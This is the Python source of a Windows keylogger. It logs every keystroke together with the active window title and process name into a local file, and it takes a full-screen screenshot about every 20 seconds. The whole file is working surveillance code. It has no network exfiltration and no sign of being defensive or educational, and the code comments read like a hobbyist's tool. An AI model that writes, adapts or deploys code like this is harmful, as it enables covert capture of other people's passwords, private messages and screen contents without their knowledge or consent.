import datetime
import os
# Removed the 'io' because it didn't really help with the char issue.
import psutil
import win32gui
import win32process
from pynput import keyboard
from PIL import ImageGrab


# Get the current directory (I would change this soon...)
current_dir = os.getcwd()

# Open the log file for writing
log_file = open(os.path.join(current_dir, "keystrokes.log"), "w")

# Set the x interval for taking screenshots (in seconds)
screenshot_interval = 20
last_screenshot_time = datetime.datetime.now()

# Track the current window title and process name
current_window_title = None
current_process_name = None

# Another shit for the shift.
shift_pressed = False


# This function gets called every time a key is pressed
def on_press(key):
    global current_window_title, current_process_name, last_screenshot_time
    try:
        # Get the title and process name of the foreground window
        window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        process_name = psutil.Process(pid[-1]).name()
        
        # If the window or process has changed, write them to the log file
        if window_title != current_window_title or process_name != current_process_name:
            if current_window_title is not None:
                log_file.write("\n")
                
            current_window_title = window_title
            current_process_name = process_name
            now = datetime.datetime.now()            
            log_file.write(f"{now.strftime('%A, %B %d, %Y [%I:%M %p]')} {current_process_name} - {current_window_title}\n")
        
        if isinstance(key, keyboard.Key):
            # Handle special keys
            if key == keyboard.Key.space:
                key_char = " "
            elif key == keyboard.Key.enter:
                key_char = "[Enter]"
            elif key == keyboard.Key.tab:
                key_char = "[Tab]"
            elif key == keyboard.Key.backspace:
                key_char = "[Backspace]"
            elif key == keyboard.Key.shift:
                key_char = ""
            elif key == keyboard.Key.alt_l:
                key_char = "[L Alt]"
            elif key == keyboard.Key.alt_r:
                key_char = "[R Alt]"
            elif key == keyboard.Key.ctrl_l:
                key_char = "[L Ctrl]"
            elif key == keyboard.Key.ctrl_r:
                key_char = "[R Ctrl]"
            else:
                key_char = f"[{str(key)}]"
        else:
            # Handle regular keys
            key_char = str(key.char)
            # Handle uppercase letters if shift key is pressed
            if keyboard.Controller().shift_pressed:
                key_char = key_char.upper()
        log_file.write(key_char.encode('utf-8', errors='ignore').decode('utf-8'))
        log_file.flush()

        # Take a screenshot if it's time
        if (datetime.datetime.now() - last_screenshot_time).seconds >= screenshot_interval:
            screenshot = ImageGrab.grab()
            screenshot.save(os.path.join(current_dir, f"screenshot_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"))
            last_screenshot_time = datetime.datetime.now()


    except Exception as e:
        print(f"Error: {e}")

# Set up a keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    try:
        while True:
            listener.join(0.1)
    except KeyboardInterrupt:
        pass

# Close the log file when we're done. I only did this because it's just a testing (Remove this part if you want to).
log_file.close() 
